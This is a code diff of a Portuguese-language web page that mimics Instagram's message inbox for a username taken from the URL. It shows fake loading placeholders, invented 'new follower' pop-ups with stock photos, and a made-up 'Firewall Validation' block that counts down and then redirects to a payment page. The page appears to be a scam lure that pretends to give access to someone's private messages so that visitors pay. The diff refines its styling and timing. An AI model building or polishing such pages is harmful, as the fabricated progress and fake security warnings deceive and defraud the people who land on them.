@@ -6,63 +6,58 @@
     <title>Instagram</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
-        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; overflow: hidden; }
-        .container { max-width: 600px; margin: auto; height: 100vh; display: flex; flex-direction: column; background: #000; }
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; overflow-x: hidden; }
+        .container { max-width: 600px; margin: auto; min-height: 100vh; display: flex; flex-direction: column; background: #000; }
 
-        /* Header */
+        /* Header & Search */
         .header { display: flex; align-items: center; padding: 10px 15px; gap: 15px; }
-        .header .username { font-size: 22px; font-weight: bold; flex-grow: 1; }
-        .header i { font-size: 24px; }
-
-        /* Search Bar */
-        .search-bar { display: flex; align-items: center; gap: 10px; padding: 10px 15px; background: #1c1c1c; border-radius: 10px; margin: 10px 15px; }
-        .search-bar i { color: #8e8e8e; }
-        .search-bar span { color: #8e8e8e; }
+        .header .username { font-size: 22px; font-weight: 600; }
+        .header .fa-chevron-down { font-size: 14px; margin-left: 2px; }
+        .header-icons { margin-left: auto; display: flex; gap: 20px; font-size: 24px; }
+        .search-bar-container { padding: 10px 15px; }
+        .search-bar { display: flex; align-items: center; gap: 12px; padding: 10px; background: #262626; border-radius: 10px; }
+        .search-bar .fa-search { color: #8e8e8e; }
+        .search-bar span { color: #8e8e8e; font-size: 16px; }
+        .search-bar .filter-btn { margin-left: auto; color: #fff; font-weight: 600; font-size: 16px; }
 
         /* Notes */
-        .notes { display: flex; justify-content: space-between; padding: 15px; }
-        .note-item { display: flex; flex-direction: column; align-items: center; gap: 8px; position: relative; }
-        .note-circle { width: 66px; height: 66px; border-radius: 50%; background: #363636; position: relative; overflow: hidden; }
-        .note-balloon { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 80px; height: 40px; z-index: 1; }
-        .note-label { width: 50px; height: 10px; background: #363636; border-radius: 5px; margin-top: 5px; }
-        .note-text { font-size: 12px; color: #ccc; margin-top: 5px; }
+        .notes { display: flex; padding: 10px 15px; gap: 20px; }
+        .note-item { display: flex; flex-direction: column; align-items: center; gap: 8px; }
+        .note-visual { position: relative; width: 66px; height: 66px; }
+        .note-circle { width: 100%; height: 100%; border-radius: 50%; background: #363636; overflow: hidden; }
+        .note-balloon { position: absolute; width: 62px; top: -18px; left: 50%; transform: translateX(-50%); z-index: 1; }
+        .note-label { width: 60px; height: 10px; background: #363636; border-radius: 5px; }
+        .note-text { font-size: 13px; color: #f5f5f5; }
 
         /* Tabs */
-        .tabs { display: flex; justify-content: space-around; padding: 0 15px; margin-bottom: 20px; }
-        .tab { padding: 8px 12px; border-radius: 8px; font-weight: bold; background: #262626; color: #a8a8a8; }
-        .tab.active { background: #fff; color: #000; }
+        .tabs { display: flex; justify-content: space-between; padding: 15px; gap: 10px; }
+        .tab { padding: 10px 14px; border-radius: 8px; font-weight: 600; font-size: 15px; background: #262626; color: #a8a8a8; flex-grow: 1; text-align: center; }
+        .tab.active { background: #4395F6; color: #fff; }
 
         /* Messages */
         .messages-list { padding: 0 15px; }
         .message-item { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; }
-        .message-avatar { width: 56px; height: 56px; border-radius: 50%; background: #363636; position: relative; overflow: hidden; }
+        .message-avatar { width: 56px; height: 56px; border-radius: 50%; background: #363636; overflow: hidden; }
         .message-details { flex-grow: 1; }
-        .message-line { height: 12px; background: #363636; border-radius: 6px; margin-bottom: 8px; position: relative; overflow: hidden; }
-        .message-line.short { width: 60%; }
-        .message-cam-icon { width: 28px; height: 28px; }
+        .message-line { height: 14px; background: #363636; border-radius: 7px; margin-bottom: 8px; }
+        .message-line.short { width: 70%; }
+        .message-cam-wrapper { position: relative; }
+        .message-cam-icon { width: 26px; height: 26px; }
+        .message-cam-wrapper::after { content: ''; position: absolute; top: -2px; right: -3px; width: 8px; height: 8px; background: #4395F6; border-radius: 50%; border: 2px solid #000; }
 
-        /* Shimmer Animation */
-        .loading-shimmer::after {
-            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
-            animation: shimmer 1.5s infinite;
-        }
-
-        /* Loading More */
-        .loading-more { text-align: center; padding: 20px; font-size: 14px; color: #8e8e8e; display: flex; justify-content: center; align-items: center; gap: 10px; }
+        /* Loading More & Animations */
+        .loading-more { display: flex; justify-content: center; align-items: center; gap: 10px; padding: 25px; font-size: 14px; color: #8e8e8e; }
         .spinner { border: 3px solid rgba(255, 255, 255, 0.2); border-top: 3px solid #4395F6; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; }
-
-        /* Firewall Error */
-        #firewall-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.9); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 100; text-align: center; }
-        #firewall-overlay h2 { color: #ff4d4d; font-size: 24px; }
-        #firewall-overlay p { font-size: 16px; }
-
-        /* Follower Notification */
-        #follower-notification { position: fixed; bottom: -100px; left: 50%; transform: translateX(-50%); background: rgba(20, 20, 20, 0.9); padding: 10px 20px; border-radius: 15px; border: 1px solid #444; display: flex; align-items: center; gap: 10px; transition: bottom 0.5s ease-in-out; z-index: 1100; }
-        #follower-notification img { width: 40px; height: 40px; border-radius: 50%; }
-
+        .loading-shimmer::after { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent); animation: shimmer 1.5s infinite; }
         @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
         @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Overlays */
+        #firewall-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.9); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 100; text-align: center; padding: 20px; box-sizing: border-box; }
+        #firewall-overlay h2 { color: #ff4d4d; font-size: 24px; }
+        #firewall-overlay p { font-size: 16px; }
+        #follower-notification { position: fixed; bottom: -100px; left: 50%; transform: translateX(-50%); background: rgba(20, 20, 20, 0.9); padding: 10px 20px; border-radius: 15px; border: 1px solid #444; display: flex; align-items: center; gap: 10px; transition: bottom 0.5s ease-in-out; z-index: 1100; }
+        #follower-notification img { width: 40px; height: 40px; border-radius: 50%; }
     </style>
 </head>
 <body>
@@ -70,19 +65,26 @@
         <div class="header">
             <i class="fas fa-arrow-left"></i>
             <span id="username-display" class="username"></span>
-            <i class="far fa-edit" style="margin-left:auto; margin-right: 15px"></i>
+            <i class="fas fa-chevron-down"></i>
+            <div class="header-icons">
+                 <i class="fas fa-video"></i>
+                 <i class="far fa-edit"></i>
+            </div>
         </div>
 
-        <div class="search-bar">
-             <i class="fas fa-search"></i>
-             <span>Pergunte à Meta AI ou pesquise</span>
+        <div class="search-bar-container">
+            <div class="search-bar">
+                <i class="fas fa-search"></i>
+                <span>Pergunte à Meta AI ou pesquise</span>
+                <div class="filter-btn">Filtrar</div>
+            </div>
         </div>
 
         <div class="notes">
-            <div class="note-item"><div class="note-circle loading-shimmer"></div><span class="note-text">Sua nota</span></div>
-            <div class="note-item"><img src="../media/bg_note.png" class="note-balloon"><div class="note-circle loading-shimmer"></div><div class="note-label loading-shimmer"></div></div>
-            <div class="note-item"><img src="../media/bg_note.png" class="note-balloon"><div class="note-circle loading-shimmer"></div><div class="note-label loading-shimmer"></div></div>
-            <div class="note-item"><img src="../media/bg_note.png" class="note-balloon"><div class="note-circle loading-shimmer"></div><div class="note-label loading-shimmer"></div></div>
+            <div class="note-item"><div class="note-visual"><div class="note-circle loading-shimmer"></div></div><span class="note-text">Sua nota</span></div>
+            <div class="note-item"><div class="note-visual"><img src="../media/bg_note.png" class="note-balloon"><div class="note-circle loading-shimmer"></div></div><div class="note-label loading-shimmer"></div></div>
+            <div class="note-item"><div class="note-visual"><img src="../media/bg_note.png" class="note-balloon"><div class="note-circle loading-shimmer"></div></div><div class="note-label loading-shimmer"></div></div>
+            <div class="note-item"><div class="note-visual"><img src="../media/bg_note.png" class="note-balloon"><div class="note-circle loading-shimmer"></div></div><div class="note-label loading-shimmer"></div></div>
         </div>
 
         <div class="tabs">
@@ -93,17 +95,17 @@
         </div>
 
         <div class="messages-list">
-            <div class="message-item"><div class="message-avatar loading-shimmer"></div><div class="message-details"><div class="message-line loading-shimmer"></div><div class="message-line short loading-shimmer"></div></div><img src="../media/cam_icon.png" class="message-cam-icon"></div>
-            <div class="message-item"><div class="message-avatar loading-shimmer"></div><div class="message-details"><div class="message-line loading-shimmer"></div><div class="message-line short loading-shimmer"></div></div><img src="../media/cam_icon.png" class="message-cam-icon"></div>
-            <div class="message-item"><div class="message-avatar loading-shimmer"></div><div class="message-details"><div class="message-line loading-shimmer"></div><div class="message-line short loading-shimmer"></div></div><img src="../media/cam_icon.png" class="message-cam-icon"></div>
+            <div class="message-item"><div class="message-avatar loading-shimmer"></div><div class="message-details"><div class="message-line loading-shimmer"></div><div class="message-line short loading-shimmer"></div></div><div class="message-cam-wrapper"><img src="../media/cam_icon.png" class="message-cam-icon"></div></div>
+            <div class="message-item"><div class="message-avatar loading-shimmer"></div><div class="message-details"><div class="message-line loading-shimmer"></div><div class="message-line short loading-shimmer"></div></div><div class="message-cam-wrapper"><img src="../media/cam_icon.png" class="message-cam-icon"></div></div>
+            <div class="message-item"><div class="message-avatar loading-shimmer"></div><div class="message-details"><div class="message-line loading-shimmer"></div><div class="message-line short loading-shimmer"></div></div><div class="message-cam-wrapper"><img src="../media/cam_icon.png" class="message-cam-icon"></div></div>
         </div>
 
         <div class="loading-more"><div class="spinner"></div><span>Acessando mais mensagens...</span></div>
     </div>
     
     <div id="firewall-overlay">
-        <h2>Firewall Validation</h2>
-        <p>Acesso bloqueado. Redirecionando em <span id="countdown">10</span> segundos...</p>
+        <h2><i class="fas fa-shield-alt"></i> Firewall Validation</h2>
+        <p>Acesso bloqueado. Redirecionando em <span id="countdown">10</span>s...</p>
     </div>
 
     <div id="follower-notification"></div>
@@ -113,23 +115,20 @@
         const username = urlParams.get('username') || 'usuário';
         document.getElementById('username-display').textContent = username;
 
-        // Simula o fim do carregamento
         setTimeout(() => {
             const shimmerElements = document.querySelectorAll('.loading-shimmer');
             shimmerElements.forEach(el => el.classList.remove('loading-shimmer'));
-        }, 3500);
+        }, 4000);
 
-        // Simula notificações de seguidores
         const notification = document.getElementById('follower-notification');
         function showNotification(index) {
-            notification.innerHTML = `<img src="https://randomuser.me/api/portraits/men/${index+5}.jpg"> <b>Seguidor ${index+1}</b> começou a seguir você.`;
+            notification.innerHTML = `<img src="https://randomuser.me/api/portraits/men/${index+10}.jpg"> <b>Seguidor ${index+1}</b> começou a seguir você.`;
             notification.style.bottom = '20px';
-            setTimeout(() => { notification.style.bottom = '-100px'; }, 3000);
+            setTimeout(() => { notification.style.bottom = '-100px'; }, 3500);
         }
-        setTimeout(() => showNotification(0), 5000);
-        setTimeout(() => showNotification(1), 10000);
+        setTimeout(() => showNotification(0), 6000);
+        setTimeout(() => showNotification(1), 11000);
 
-        // Lógica do Firewall
         setTimeout(() => {
             const firewallOverlay = document.getElementById('firewall-overlay');
             firewallOverlay.style.display = 'flex';
@@ -137,7 +136,7 @@
             const countdownElement = document.getElementById('countdown');
             const countdownInterval = setInterval(() => {
                 countdownValue--;
-                countdownElement.textContent = countdownValue + ' segundos...';
+                countdownElement.textContent = countdownValue + 's...';
                 if (countdownValue <= 0) {
                     clearInterval(countdownInterval);
                     window.location.href = `../payment-account/?username=${username}`;
